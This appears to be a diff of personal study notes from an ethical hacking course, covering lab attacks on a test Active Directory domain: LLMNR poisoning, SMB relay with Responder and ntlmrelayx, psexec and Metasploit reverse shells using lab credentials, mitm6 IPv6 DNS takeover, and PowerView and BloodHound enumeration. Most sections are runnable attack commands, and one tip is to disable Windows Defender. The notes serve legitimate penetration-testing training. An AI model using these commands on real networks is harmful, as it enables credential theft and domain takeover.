@@ -1,7 +1,4 @@
 
-# Practical Ethical Hacking - The Complete Course
-
-
 
 ## Before We Begin
 
@@ -1936,6 +1933,16 @@ Not mucht findings...
 > Immunity Debugger:
 > https://www.immunityinc.com/products/debugger/
 
+> [!warning] 
+>  Course Provider don't give support if not Windows 10 / Windows 2019 Server is used.
+>  So ensure using this ISO's:
+>  
+>  Windows 2019 Server Evaluation (english)
+>  https://software-download.microsoft.com/download/pr/17763.737.190906-2324.rs5_release_svc_refresh_SERVER_EVAL_x64FRE_en-us_1.iso
+>  
+>  Windows 10 Enterprise CLIENT Eval (english)
+>  https://software-download.microsoft.com/download/pr/19041.264.200511-0456.vb_release_svc_refresh_CLIENTENTERPRISEEVAL_OEMRET_x64FRE_en-us.iso
+
 
 ### Buffer Overflows Explained
 
@@ -2531,7 +2538,7 @@ On one of client
 > [!todo] 
 >  In Kali run `sudo responder -I eth0 -rdwv`
 >  for me parameter `-rdwv` gave error. 
-> I try it with following command `sudo responder -I eth0 -Pv`
+> I try it with following command `sudo responder -I eth0 -Adwv`
 
 ![[Pasted image 20230219150535.png]]
 
@@ -2579,4 +2586,447 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 ![[Pasted image 20230219155148.png]]
 
 ### LLMNR Poisoning Defense
+
+![[Pasted image 20230311154640.png]]
+
+> [!info] 
+> Send to client how to fix Issue or put it in report
+> 
+
+> [!tip] 
+> Inform customer about risk of short passwords. 
+> 
+
+### SMB Relay Attacks Overview
+
+![[Pasted image 20230311161827.png]]
+
+![[Pasted image 20230311162545.png]]
+
+> [!todo] 
+> We only capture to SMB, but don't interact:
+> Adjust `Responder.conf`
+> `sudo pico /usr/share/responder/Responder.conf`
+> We use other tool to relay
+> 
+
+![[Pasted image 20230311163155.png]]
+
+> [!todo] 
+> Start responder:
+> `sudo responder -I eth0 -Adwv` 
+
+![[Pasted image 20230311170128.png]]
+
+> [!todo] 
+> Install ntlmrelayx on Kali:
+> https://www.kali.org/tools/impacket/
+> `sudo apt install python3-impacket`
+
+> [!todo] 
+> Run SMB Relay
+> `impacket-ntlmrelayx -tf targets.txt -smb2support` 
+
+> [!caution] 
+> Don't forget that this attack is only working if you're Administrator on Computer. 
+
+![[Pasted image 20230311175315.png]]
+
+### Quick Lab Update
+
+> [!attention] 
+> That is attack is working we have to enable `Network Discovery` 
+> We have to this on both on our VMs
+
+![[Pasted image 20230311181427.png]]
+
+### Discovering Hosts with SMB Signing Disabled
+
+> [!faq] 
+>  **Question**: My SMB relay is not working. How do I resolve?
+>  ---
+>  **Resolution**: There have been reports that SMB is failing to relay for some users in their labs. If this is happening, attempt to navigate to the attacker’s IP address from a web browser (such as \192.168.10.1) instead of the SMB event. You should trigger a relay.
+
+> [!tip] 
+> - You could  run a Nessus scan to get hosts with SMB Signing Disabled
+> - Also via `nmap` scan
+> - Search on github for it
+
+> [!todo] 
+>  **nmap scan**
+>  `sudo nmap --script=smb2-security-mode.nse -p445 192.168.203.0/24`
+
+> [!caution] 
+> Run command as root, otherwise you will not get any detail information
+> 
+
+![[Pasted image 20230311184012.png]]
+
+> [!todo] 
+> Put a target IP which not required signing  to `targets.txt`
+
+### SMB Relay Attack Demonstration Part 1
+
+![[Pasted image 20230311184946.png]]
+
+> [!todo] 
+> Run command:
+>  `sudo responder -I eth0 -Adwv`
+
+> [!todo] 
+> Run command:
+> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`  
+
+![[Pasted image 20230311185520.png]]
+
+> [!todo] 
+> Start responder:
+> `sudo responder -I eth0 -Adwv` 
+
+> [!todo] 
+> On Windows VM, put IP of Kali Machine:
+> `\\ip-kali-machine`
+
+![[Pasted image 20230311190013.png]]
+
+![[Pasted image 20230313115943.png]]
+
+> [!info] 
+> Now having possiblility to crack hashes offline
+> 
+
+
+### SMB Relay Attack Demonstration Part 2
+
+> [!todo] 
+>` sudo responder -I eth0 -dwv`
+> 
+> Interactive Shell:
+>  `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i`
+
+![[Pasted image 20230313124200.png]]
+
+> [!todo] 
+> Connect to shell via NC
+> `nc 127.0.0.1 11000` 
+
+![[Pasted image 20230313124447.png]]
+
+> [!tip] 
+> Can create payload with msfvenom:
+> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e test.exe` 
+> -----
+> Run specific command:
+> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "some command"` 
+
+### SMB Relay Attack Defenses
+
+![[Pasted image 20230313125306.png]]
+
+### Gaining Shell Access
+
+> [!todo] 
+> Start Metasploit:
+> `msfconsole`
+> Search for `psexec` 
+
+![[Pasted image 20230313125727.png]]
+
+> [!todo] 
+> Set Options:
+> `set rhosts 192.168.230.137` 
+> `set smbdomain marvel.local`
+> `set smbpass Password1`
+> `set smbuser fcastle`
+> `set payload windows/x64/meterpreter/reverse_tcp`
+> `set lhost eth0`
+> `run`
+
+![[Pasted image 20230313153648.png]]
+
+> [!todo] 
+> `show targets`
+> `set target 2`
+
+ ![[Pasted image 20230314072936.png]]
+
+> [!fail] 
+> No luck, Windows Defender blocked our attack:
+
+![[Pasted image 20230314073135.png]] 
+
+> [!fail] 
+> Other try:
+> `impacket-psexec marvel.local/fcastle:Password1@192.168.203.137`
+> At time of course recording, Windows Defender not catch this Attack. But now it catch attack. 
+
+> [!fail] 
+> Same problem with:
+> `impacket-wmiexec  marvel.local/fcastle:Password1@192.168.203.137` 
+
+> [!tip] 
+>  Deactivate Windows Defender allows this attack
+
+![[Pasted image 20230314075345.png]]
+
+### IPv6 Attacks Overview
+
+> [!hint] 
+> There is a good chance that there is IPv6 enabled in Network but not setup and no DNS Server configured. This is place where we jump in.
+> 
+
+![[Pasted image 20230314080007.png]]
+
+### Installing mitm6
+
+> [!todo] 
+> Download:
+> `git clone https://github.com/dirkjanm/mitm6`
+> `sudo -s`
+> `pip3 install -r requirements.txt`
+
+### Setting Up LDAPS
+
+![[Pasted image 20230314081214.png]]
+
+> [!todo] 
+> Next, Next
+> 
+
+![[Pasted image 20230314081256.png]]
+
+> [!todo] 
+> Next, Next, Next, Install, Close
+
+![[Pasted image 20230314081427.png]]
+
+![[Pasted image 20230314081457.png]]
+
+### IPv6 DNS Takeover via mitm6
+
+> [!info] 
+> Resources for this video:
+>  - mitm6: [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) 
+>  - Combining NTLM Relays and Kerberos Delegation: [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+
+> [!faq] 
+>**Question**: My ntlmrelayx is giving an error during the attack. How can I resolve?
+  **Resolution**: Impacket versions > 0.9.19 are unstable and causing issues for students and pentesters alike. Try purging impacket completely and downloading 0.9.19 from here: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases)
+
+> [!todo] 
+> Run mitm6:
+> `sudo -s`
+> `sudo mitm6 -d marvel.local` 
+
+![[Pasted image 20230315075658.png]]
+
+> [!todo]  
+> Run Relay Attack (IP of DC):
+> `impacket-ntlmrelayx -6 -t ldaps://192.168.203.136 -wh fakewpad.marvel.local -l lootme
+`
+
+> [!todo] 
+> Reboot Domain Controller.
+> Normally DC refresh DNS every 30 min. With Reboot we speed up this process.
+
+![[Pasted image 20230315080145.png]]
+
+![[Pasted image 20230315080248.png]]
+
+> [!todo] 
+> Run:
+> `firefox domain_users_by_group.html`  
+
+![[Pasted image 20230315080459.png]]
+
+> [!todo] 
+> Login with Domain Admininistrator to our Windows 10 VM
+> 
+
+> [!info] 
+> Take Over Domain Controller
+> 
+
+> [!warning] 
+> Fix :  (All commands are executed on the Domain Controller)
+>  start / run / cmd  ( as administrator )
+>  `powershell -ep bypass`
+>  `Uninstall-AdcsCertificationAuthority`
+>  hit A for all 
+>  Reboot the DC 
+>  ---
+>  Login to DC as Administrator 
+>  start / run / cmd (as administrator)
+>  `powershell -ep bypass`
+>  (command is one very long line not multiple lines)
+>  `Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" -KeyLength 2048 -HashAlgorithmName SHA1 -ValidityPeriod Years -ValidityPeriodUnits 99`
+>  hit A for all 
+>  Reboot the DC
+>  ---
+>  Login to DC
+>  Re-attempt attack in kali
+>  `sudo mitm6 -d marvel.local`
+> `sudo ntlmrelayx.py -6 -t ldaps://your.dc.ip.here -wh fakewpad.marvel.local -l lootme`
+
+![[Pasted image 20230316100736.png]]
+
+![[Pasted image 20230316100820.png]]
+
+![[Pasted image 20230316101259.png]]
+
+> [!tip] 
+> IPv6 Attacks are very powerful, see more in detailed article here:
+> https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
+> **The mitm6 attack**
+> - Attack phase 1 – Primary DNS takeover
+> - Attack phase 2 – DNS spoofing
+> - Exploiting WPAD (Windows Proxy Auto Detection)
+> - The full attack
+> - Defenses and mitigations
+> - Detection
+> ---
+> The worst of both worlds: Combining NTLM Relaying and Kerberos delegation
+> https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+> `Example of insecure Active Directory default`
+> - Attack TL;DR
+> - No credentials, no problem
+> 	- By default, any user in Active Directory can create up to 10 computer accounts
+> 	- Computer account credentials can be used for all kinds of things in AD, such as querying domain information or even running BloodHound:
+> - Relaying and configuring delegation
+> - Other abuse avenues
+> - Tools
+> - Mitigations
+
+### IPv6 Attack Defenses
+
+![[Pasted image 20230316104911.png]]
+
+### Passback Attacks
+
+> [!info] 
+>  A Pen Tester’s Guide to Printer Hacking
+>  https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+
+![[Pasted image 20230316110458.png]]
+
+> [!tip] 
+> **Passback Attack:**
+> If you can't see Password on device, point IP to your device and you can see request with credentials. 
+> 
+
+
+### Other Attack Vectors and Strategies
+
+![[Pasted image 20230316110928.png]]
+
+> [!info] 
+> http_version is a Module in Metasploit to look for Websites inside network.
+> 
+
+> [!tip] 
+> A printer can give you in some cases Domain Admin Access
+> Scan and Share feature sometimes use Domain Admin to save scans via SMB
+
+> [!hint] 
+> Always look up default credential of services / sites you discover inside network
+> 
+
+
+## Attacking Active Directory: Post-Compromise Enumeration
+
+### PowerView Overview
+
+> [!info] 
+> Download PowerView:
+> https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+> 
+
+### Domain Enumeration with PowerView
+
+> [!info] 
+>  Resources for this video:
+>  PowerView Cheat Sheet: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+> [!todo] 
+> - Open `cmd` on Windows Machine 
+> - `powershell -ep bypass`
+> - Load PowerView: `. .\PowerView.ps1`
+> - `Get-NetDomain`
+> - `Get-NetDomainController`
+> - `Get-DomainPolicy`
+> - `(Get-DomainPolicy)."SystemAccess"`
+> - `Get-NetUser`
+> - `Get-NetUser | select cn`
+> - `Get-NetUser | select Description`
+> - `Get-DomainUser`
+> - `Get-DomainUser -Properties pwdlastset`
+> - `Get-DomainUser -Properties logoncount`
+> - `Get-DomainUser -Properties badpwdcount`
+> - `Get-NetComputer`
+> - `Get-NetComputer | select OperatingSystem`
+> - `Get-NetGroup`
+> - `Invoke-ShareFinder`
+> - `Get-NetGPO`
+> - `Get-NetGPO | select displayname, whenchanged`
+
+![[Pasted image 20230317064634.png]]
+
+![[Pasted image 20230317064650.png]]
+
+![[Pasted image 20230317065138.png]]
+
+![[Pasted image 20230317065400.png]]
+
+![[Pasted image 20230317065446.png]]
+
+![[Pasted image 20230317065527.png]]
+
+![[Pasted image 20230317065603.png]]
+
+![[Pasted image 20230317082030.png]]
+
+![[Pasted image 20230317082042.png]]
+
+![[Pasted image 20230317082131.png]]
+> [!warning] 
+> If you see a user never logged in, maybe this is a **honeypot** account 
+
+![[Pasted image 20230317082254.png]]
+
+![[Pasted image 20230317082436.png]]
+
+![[Pasted image 20230317082617.png]]
+
+![[Pasted image 20230317082814.png]]
+
+![[Pasted image 20230317083154.png]]
+
+![[Pasted image 20230317083258.png]]
+
+![[Pasted image 20230317083413.png]]
+
+### Bloodhound Overview and Setup
+
+> [!info] 
+> Download all DC / Domain related data and analyzing. 
+> 
+
+> [!todo] 
+> Install bloodhound
+> `sudo apt install bloodhound` 
+> `sudo neo4j console`
+> Open: `http://localhost:7474/`
+> Login with User: `neo4j` and PW: `neo4j`
+> Change to new strong password
+> run `sudo bloodhound`
+> Login with new credentials
+
+
+### Grabbing Data with Invoke-Bloodhound
+
+> [!todo] 
+> Download SharpHound.ps1 on Windows Target:
+> https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+> 
+
 
